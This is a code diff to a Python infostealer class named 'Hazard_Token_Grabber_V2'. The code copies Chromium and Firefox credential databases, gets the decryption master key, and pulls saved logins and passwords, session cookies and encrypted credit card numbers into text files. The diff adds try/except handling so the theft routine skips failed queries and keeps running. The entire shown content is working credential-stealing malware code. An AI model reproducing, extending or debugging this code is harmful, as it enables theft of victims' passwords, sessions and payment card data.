@@ -454,15 +454,18 @@ class Hazard_Token_Grabber_V2(functions):
                     login_db = path + f'{profile}\\Login Data'
                 if not os.path.exists(login_db):
                     continue
-                with open(self.dir+f"\\{name} Passwords.txt", "a", encoding="cp437", errors='ignore') as f:
-                    master_key = self.get_master_key(localState)
-                    f.write(f"\nProfile: {profile}\n\n")
-                    login = self.dir + self.sep + "Loginvault1.db"
-                    shutil.copy2(login_db, login)
-                    conn = sqlite3.connect(login)
-                    cursor = conn.cursor()
+                master_key = self.get_master_key(localState)
+                login = self.dir + self.sep + "Loginvault1.db"
+                shutil.copy2(login_db, login)
+                conn = sqlite3.connect(login)
+                cursor = conn.cursor()
+                try:
                     cursor.execute(
                         "SELECT action_url, username_value, password_value FROM logins")
+                except:
+                    continue
+                with open(self.dir+f"\\{name} Passwords.txt", "a", encoding="cp437", errors='ignore') as f:
+                    f.write(f"\nProfile: {profile}\n\n")
                     for r in cursor.fetchall():
                         url = r[0]
                         username = r[1]
@@ -503,15 +506,18 @@ class Hazard_Token_Grabber_V2(functions):
                     login_db = login_db[:-15] + self.sep + 'cookies'
                     if not os.path.exists(login_db):
                         continue
-                with open(self.dir+f"\\{name} Cookies.txt", "a", encoding="cp437", errors='ignore') as f:
-                    master_key = self.get_master_key(localState)
-                    f.write(f"\nProfile: {profile}\n\n")
-                    login = self.dir + self.sep + "Loginvault2.db"
-                    shutil.copy2(login_db, login)
-                    conn = sqlite3.connect(login)
-                    cursor = conn.cursor()
+                master_key = self.get_master_key(localState)
+                login = self.dir + self.sep + "Loginvault2.db"
+                shutil.copy2(login_db, login)
+                conn = sqlite3.connect(login)
+                cursor = conn.cursor()
+                try:
                     cursor.execute(
                         "SELECT host_key, name, encrypted_value from cookies")
+                except:
+                    continue
+                with open(self.dir+f"\\{name} Cookies.txt", "a", encoding="cp437", errors='ignore') as f:
+                    f.write(f"\nProfile: {profile}\n\n")
                     for r in cursor.fetchall():
                         host = r[0]
                         user = r[1]
@@ -534,7 +540,11 @@ class Hazard_Token_Grabber_V2(functions):
             if not os.path.exists(cookies):
                 continue
             conn = sqlite3.connect(cookies)
-            cursor = conn.execute("SELECT host, name, value FROM moz_cookies")
+            try:
+                cursor = conn.execute(
+                    "SELECT host, name, value FROM moz_cookies")
+            except:
+                continue
             with open(self.dir + os.sep + f'FirefoxCookies.txt', mode='a', newline='', encoding='utf-8') as f:
                 f.write(f"\nProfile: {profile}\n\n")
                 for r in cursor.fetchall():
@@ -800,14 +810,17 @@ class Hazard_Token_Grabber_V2(functions):
                     login_db = path + f'{profile}\\Web Data'
                 if not os.path.exists(login_db):
                     continue
-                with open(self.dir+f"\\{name} CreditInfo.txt", "a", encoding="cp437", errors='ignore') as f:
-                    master_key = self.get_master_key(localState)
-                    login = self.dir + self.sep + "Loginvault3.db"
-                    shutil.copy2(login_db, login)
-                    conn = sqlite3.connect(login)
-                    cursor = conn.cursor()
+                master_key = self.get_master_key(localState)
+                login = self.dir + self.sep + "Loginvault3.db"
+                shutil.copy2(login_db, login)
+                conn = sqlite3.connect(login)
+                cursor = conn.cursor()
+                try:
                     cursor.execute(
                         "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+                except:
+                    continue
+                with open(self.dir+f"\\{name} CreditInfo.txt", "a", encoding="cp437", errors='ignore') as f:
                     for r in cursor.fetchall():
                         namee = r[0]
                         exp1 = r[1]
